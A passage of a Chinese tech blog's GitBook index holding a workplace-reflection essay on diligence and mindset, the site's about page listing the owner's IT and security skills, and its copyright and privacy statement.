例如平时可以多留一个心眼，把新的想法或遇到的问题进行记录，这样日积月累下来，在遇到新的问题时就不至于手忙脚乱，甚至可以利用以往类似的处理经验，达到事半功倍的效果。 不过，有好的想法固然不错，但更重要的是将其付诸行动，找到一种属于自己的工作模式，而不仅仅是纸上谈兵。 慎言笃行：真诚做人，踏实做事 “真诚做人，踏实做事”，这其实也就是我入职时了解到的企业文化之一。 做事先做人，人脉关系是经营工作的必修课。在我看来，交际圈的尺寸，与能否诚心待人是正相关的。但无论与他人相处如何，都必须谨慎言行，视场合说话。语言是把双刃剑，所谓“祸从口出”，当不知道说什么的时候，既不是阿谀奉承，也不应论人是非——不逞口舌之快，有时踏踏实实多做事，远比一切语言更具说服力。 想起我刚入职的时候，就接到了一个特殊“任务”：必须在限期内认识组内所有同事，并让他们认识我。这确实不是一个好差事，因为当时我连组内有哪些人都不清楚，就是说我连自我介绍的对象都没有……不过也不知是我人缘好还是面皮厚，这个任务最后还是完成了。 而现在的我已经结识不少其他部门的同事了，在这段期间，受到了非常多同事的包容和照顾，其实我能够这么快融入公司，离不开同事之间的良好氛围。我都甚至觉得，我的人际关系，其实是大家帮我经营起来的。 云在青天水在瓶：心态决定位置 这其实是我比较信奉的一句座右铭。云和水都是同一种物质，但是它们的形态决定了它们所处的位置。但也不应该因为身处青天而自傲，因为身处瓶中而自卑。 在职期间，我并不是所有工作都一帆风顺，我也因为规范性事故受过批评、被扣过绩效。后来也因为工作表现好而受到了表扬和奖励。但其实我个人看待事情的心态是比较淡薄的，我不会随便自暴自弃，也不会骄傲自负。我觉得既然是自己的问题，就应该承认并纠正，逃避并不是解决问题的方法；而对于嘉许，平常心看待即可。 我觉得相比于工作模式和人脉培养，工作其实更依赖于内心的修养。一份良好的心态，在一定程度上可以反映出以后工作的发展空间、以及对挫折的承受能力，甚至为自己提供了一个精神支持。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/site_package.html":{"url":"markdown/site_package.html","title":"站长工具","keywords":"","body":"站长工具站长工具 正在重定向到内容页面 ...... 如果您的浏览器没有自动跳转， 请点击这里 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 09:51:49 "},"markdown/about/about_us.html":{"url":"markdown/about/about_us.html","title":"关于我们","keywords":"","body":"EXP-BLOG站点介绍站长介绍联系方式EXP-BLOG 站点介绍 本站站点是：EXP 技术博客（https://exp-blog.com） 本站的文章 95% 为站长在不同时期的原创作品，初衷是为了记录学习过程中的点点滴滴以验证自身，因此所分享的内容主要取决于站长当时正在做什么方面的研究，导致覆盖到的领域可能相对比较广泛。 撰写内容以 IT 软件方面为主，如算法、安全、前后端开发技能、经验心得等，尤其针对特定领域、或热门领域，会尽可能设立技术专题与大家分享。 此博客是利用 GitBook 搭建的，同时兼容在 Github Pages 和 本地（线下） 运行。 站长介绍 站长 EXP 个人简历 （JS动画） 生涯 6年 学生时期因为热衷算法，在ACM社团写了不少POJ解题报告，参与了多种校内外比赛并获得一定成绩因工作本职需要面对多种接口的海量数据，涉猎数据分析和挖掘后自然天成进阶爬虫（B站、新浪、腾讯、百度都去参观了一下）一次游戏时的偶然机会接触到了逆向工程为了跟上时代脚步开始了研究人工智能和方块链的不归路最终决定专注于安防领域的渗透测试，圆了小时候一直以来的梦想 职称 高级 系统架构师 座右铭 工作 适用的，才是最好的   生活 因上努力，果上求缘 职业技能 流程 需求、分析、设计、开发、测试、运维   文档 Markdown、Word、Excel、PPT、Visio   工具 Maven（插件/骨架）、Nexus、Jenkins、Git/SVN、Eclipse、PyCharm、VS、VMWare、Wireshark、Fiddler、OD、SecureCRT、Shadowsocks、WordPress   管理 日志管理、版本管理、构件管理、项目管理、自动化部署、自动化升级 专业技能 语言 C/C++、Java、Python、汇编、Ruby   基础 数据结构、设计模式、字符集/编码、多线程、正则、Cron、开发规范   后端 UML、数据库（SQL/NoSQL）、单元测试、Debug、逆向工程、端口转发   前端 HTML、CSS、JavaScript、PHP、Swing   协议 TCP/UDP、Socket、WebSocket、SOAP（WebServices）、HTTP/HTTPS、Cookie、XML、JSON、FTP、Telnet、MAIL、MQ（JMS/Kafka）、Corba   系统 Windows、Linux、Mac、Kali 领域技能 专题 算法、爬虫、渗透测试、大数据分析（数据挖掘）、嵌入式开发、驱动开发、深度学习、区块链   架构 Kafka、Zookeeper、Dubbo、Ansible 其他技能   构件封装、网站建设、图像处理、3D建模（OpenGL/3DMAX）、视频剪辑 联系方式 QQ：289065406 Email：289065406@qq.com WeChat 公众号： Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/about/copyright.html":{"url":"markdown/about/copyright.html","title":"版权声明","keywords":"","body":"版权声明前言免责声明隐私原则消息推送版权声明 前言 我们的站点是：EXP技术博客（https://exp-blog.com） 您使用或继续使用我们（EXP技术博客）的服务，即意味着同意我们按照本《隐私策略和版权声明》收集、使用、储存和分享您的相关信息。 如对本《隐私策略和版权声明》或相关事宜有任何问题，请通过 Email : 289065406@qq.com 与我们联系。 免责声明 本站的内容均基于《署名-非商业性使用-相同方式共享 3.0 中国大陆 (CC BY-NC-SA 3.0 CN)》协议创作或转载，您可以转载分享，但同时应该保留原文链接。 本站提供的所有内容仅供学习、分享与交流，我们不保证内容的正确性。通过使用本站内容随之而来的风险与本站无关。当使用本站时，代表您已接受本站的免责声明和隐私原则等条款。 隐私原则 本站的留言区可能会透露您的隐私信息，当您留言时，您的电子邮箱、Cookie信息和IP地址都会被记录。这些信息仅为了改进我们的网站质量和可能的交流沟通。我们不会将这些信息进行展示、出租或出售给任何人。但以下情况除外： 只有透露您的个人资料，才能提供您所要求的产品和服务； 我们需要听从法庭传票、法律命令或遵循法律程序； 我们发现您违反了本站已发布的条款或声明。 消息推送 您在使用我们的服务时，我们可能使用您的信息向您的设备发送电子邮件、新闻或推送通知。如您不希望收到这些信息，可以按照我们的相关提示，在设备上选择取消订阅。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "}}